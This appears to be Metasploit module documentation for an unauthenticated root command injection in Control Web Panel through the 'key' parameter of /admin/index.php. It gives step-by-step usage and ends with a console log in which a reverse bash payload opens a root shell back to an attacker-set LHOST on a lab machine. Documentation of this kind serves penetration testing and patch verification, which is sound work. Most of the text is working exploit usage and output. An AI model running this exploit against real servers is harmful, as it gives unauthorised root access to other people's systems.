## Vulnerable Application

Control Web Panel (CWP) versions <= 0.9.8.1208 are vulnerable to unauthenticated OS command injection
via the `key` GET parameter in `/admin/index.php` when the `api` parameter is set. Successful
exploitation results in code execution as the root user.

This is a blind command injection vulnerability - results are not returned in the HTTP response.

**Prerequisites**: Softaculous and/or SitePad must be installed via the Scripts Manager.

## Verification Steps

1. Install CWP version 0.9.8.1208 or earlier on CentOS 7/8
2. Install Softaculous via CWP Scripts Manager
3. Start Metasploit: `msfconsole`
4. Load the module: `use exploit/linux/http/control_web_panel_api_cmd_exec`
5. Set options: `set RHOSTS <target>` and `set LHOST <attacker>`
6. Run: `check` to verify vulnerability
7. Run: `exploit` to get a shell

## Options

### TARGETURI

The path to the vulnerable endpoint. Default: `/admin/index.php`

### SSL

CWP admin panel typically runs on HTTPS port 2031. Default: `true`

## Scenarios

### CWP Version 0.9.8.1208 on CentOS 8

```
msf6 > use exploit/linux/http/control_web_panel_api_cmd_exec
[*] No payload configured, defaulting to cmd/unix/python/meterpreter/reverse_tcp
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > set RHOSTS 192.168.123.134
RHOSTS => 192.168.123.134
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > set RPORT 2031
RPORT => 2031
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > set SSL true
SSL => true
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > set LHOST 192.168.123.128
LHOST => 192.168.123.128
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > set payload cmd/unix/reverse_bash
payload => cmd/unix/reverse_bash
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > check
[*] Checking vulnerability with sleep command (waiting 6 seconds)...
[+] 192.168.123.134:2031 - The target appears to be vulnerable. Server waited 6.3 seconds (expected >= 6).
msf6 exploit(linux/http/control_web_panel_api_cmd_exec) > exploit

[*] Started reverse TCP handler on 192.168.123.128:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking vulnerability with sleep command (waiting 7 seconds)...
[+] The target appears to be vulnerable. Server waited 7.25 seconds (expected >= 7).
[*] Executing Unix Command for cmd/unix/reverse_bash
[*] Command shell session 1 opened (192.168.123.128:4444 -> 192.168.123.134:47550) at 2025-12-23 19:00:26 -0500

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
hostname
localhost.localdomain
cat /etc/redhat-release
CentOS Linux release 8.5.2111
```
